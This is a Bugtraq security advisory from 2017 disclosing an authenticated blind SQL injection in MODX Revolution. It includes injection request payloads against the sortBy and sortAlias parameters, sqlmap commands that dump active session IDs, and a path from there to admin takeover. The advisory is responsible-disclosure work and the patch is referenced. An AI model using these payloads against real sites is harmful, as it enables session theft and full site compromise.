@@ -1,0 +1,222 @@
+
+Date: Tue, 2 May 2017 18:14:16 +0300
+From: Anti Räis <antirais@...il.com>
+To: bugtraq@...urityfocus.com
+Subject: MODX Revolution 2.0.1-pl - 2.5.6-pl blind SQLi
+
+MODX Revolution 2.0.1-pl - 2.5.6-pl blind SQLi
+##############################################
+
+Information
+===========
+
+Name:          MODX Revolution 2.0.1 - 2.5.6 (based on git commit)
+Software:      MODX CMS
+Homepage:      https://modx.com
+Vulnerability: blind SQL injection
+Prerequisites: attacker needs to be authenticated and with correct
+               permissions
+Severity:      high
+CVE:           NA
+Credit:        Anti Räis
+HTML version:  https://bitflipper.eu
+
+Description
+===========
+
+A SQL injection vulnerability was discovered in the xPDO library used by
+MODX Revolution 2.5.6. The "resource/getNodes" and "system/contenttype/
+getlist" actions are vulnerable and allow an authenticated attacker to read
+data from database.
+
+Proof of Concept
+================
+
+1) Action: "resource/getNodes"
+------------------------------
+
+Following request demonstrates the vulnerability. We can use different
+criteria for "limit" and the generated response is limited accordingly,
+proving that the vulnerability exists.
+
+URL: http://victim.site/connectors/index.php?action=resource/getNodes&id=web
+
+================[ src start ]================
+POST /connectors/index.php?action=resource/getNodes&id=web HTTP/1.1
+Host: victim.site
+modAuth: modx58dd6b78abecd0.81702322_158e1eb90b8b9e0.82418629
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Content-Length: 90
+Cookie: PHPSESSID=cj4hefna5no0hj0a0na84ir4t4
+Connection: close
+
+sortBy=menuindex` limit 1 #
+================[ src end ]==================
+
+
+The HTTP request above executes the `getResourceQuery()` method in
+`modResourceGetNodesProcessor` class.
+
+================[ src start ]================
+<?php
+
+public function getResourceQuery() {
+    // ... source redacted
+
+    $this->itemClass= 'modResource';
+    $c= $this->modx->newQuery($this->itemClass);
+
+    // ... source redacted
+
+    $c->groupby($this->modx->getSelectColumns('modResource', 'modResource',
+    '', $resourceColumns), '');
+    $sortBy = $this->modx->escape($this->getProperty('sortBy'));
+    $c->sortby('modResource.' . $sortBy,$this->getProperty('sortDir'));
+    return $c;
+}
+================[ src end ]==================
+
+The `sortBy` parameter is passed to the `escape()` method, which resides in
+`xPDO` class.
+
+================[ src start ]================
+<?php
+
+public function escape($string) {
+    $string = trim($string, $this->_escapeCharOpen .
+    $this->_escapeCharClose);
+    return $this->_escapeCharOpen . $string . $this->_escapeCharClose;
+}
+================[ src end ]==================
+
+The parameter `$string` is used as an argument to `trim()` function, which
+removes `_escapeCharOpen` and `_escapeCharClose` characters from the
+beginning and end of the string. In this case, the escape characters are
+both backticks (U+0060). The resulting string is then padded with escape
+characters which effectively removes multiple occurrences of escape
+characters from the beginning and end of the string, but does not escape the
+escape characters itself.
+
+The result is then concatenated to create the SQL query in
+`getResourceQuery()` method. Following SQL is sent to the database engine:
+
+================[ src start ]================
+SELECT `modResource`.`id`, /* redacted for brevity */, COUNT(Child.id) AS
+childrenCount
+FROM `modx_site_content` AS `modResource`
+LEFT JOIN `modx_site_content` `Child` ON modResource.id = Child.parent
+WHERE (  ( `modResource`.`context_key` = ? AND `modResource`.`show_in_tree`
+= ? ) AND `modResource`.`parent` = ? )
+GROUP BY `modResource`.`id`, /* redacted for brevity */,
+`modResource`.`context_key`
+ORDER BY modResource.`menuindex` limit 1 #` ASC
+================[ src end ]==================
+
+2) Action: "system/contenttype/getlist"
+---------------------------------------
+
+Similarly to previous vulnerability, the following issue ends up using the
+same vulnerable `escape()` method and allows to use blind SQL injection to
+query the database. Following parameter `sortAlias` can be used to inject
+SQL.
+
+================[ src start ]================
+POST /connectors/index.php HTTP/1.1
+Host: victim.site
+modAuth: modx58dd6b78abecd0.81702322_158e1f669c75121.62443671
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Referer: http://victim.site/manager/?a=resource/create
+Content-Length: 81
+Cookie: PHPSESSID=mq0kub9tiu3dv7l00ec472n9v6
+Connection: close
+
+id=1&action=system%2Fcontenttype%2Fgetlist&sortAlias=modContentType_id`
+limit 1 #
+================[ src end ]==================
+
+Example attack scenario
+=======================
+
+A sqlmap.py can be used with following parameters:
+
+================[ src start ]================
+$ ./sqlmap.py --version
+1.1.3.19#dev
+$ ./sqlmap.py -r request.txt -p sortBy --level 5 --risk 3 --technique=B -b
+================[ src end ]==================
+
+The request file `request.txt` is the following (update modAuth header and
+PHPSESSID cookie for valid ones):
+
+================[ src start ]================
+POST /connectors/index.php?action=resource/getNodes&id=web HTTP/1.1
+Host: victim.site
+Content-Length: 168
+modAuth: modx58dd6b78abecd0.81702322_158e295393a1643.87130735
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+Cookie: PHPSESSID=bhhu2cv7f1fbrr5dhig4afkrt5
+Connection: close
+
+sortBy=menuindex`
+================[ src end ]==================
+
+To dump session data, use:
+
+================[ src start ]================
+$ ./sqlmap.py -r request.txt -p sortBy --level 5 --risk 3 --technique=B -D \
+modx -T modx_session -C id --dump
+
+Database: modx
+Table: modx_session
+[5 entries]
++----------------------------+
+| id                         |
++----------------------------+
+| 2gpsqqdl030acmmj393vp79lu6 |
+| 9uufrqkomi38nhpgpiq20m4rm4 |
+| anbnkhvrsgh42447tgpelc32v0 |
+| bhhu2cv7f1fbrr5dhig4afkrt5 |
+| mq0kub9tiu3dv7l00ec472n9v6 |
++----------------------------+
+================[ src end ]==================
+
+Impact
+======
+
+The `modx_sessions` table holds active sessions and attacker can use blind
+SQL injection to query users' sessions in the database. This could possibly
+lead to admin account takeover or at least enable to access other accounts.
+In case the attacker manages to get active session for admin account, then
+he can execute PHP code (plugin install, file upload etc) and take control
+over the application. Alternatively the attacker can access other user's
+account and possibly use their access rights to compromise the site further.
+
+Conclusion
+==========
+
+Authenticated attacker can use blind SQL injection to get access to
+administrator account, which allows to execute PHP code, leading to full
+site compromise.
+
+Following release has been published mitigating this issue:
+https://modx.com/blog/modx-revolution-2.5.7
+
+Timeline
+========
+
+* 01.04.2017 | me > developer     | vulnerability discovered
+* 03.04.2017 | me > developer     | sent the report to the developers
+* 03.04.2017 | developer > me     | asked for PoC of reading user's session
+                                    from database
+* 05.04.2017 | developer > me     | vulnerability patched
+* 21.04.2017 | developer > public | new version released
+* 01.05.2017 | me > public        | full disclosure
+
+---
+Anti Räis
+Blog: https://bitflipper.eu
+Pentester at http://www.clarifiedsecurity.com
+
+
+
+Download attachment "signature.asc" of type "application/pgp-signature" (820 bytes)
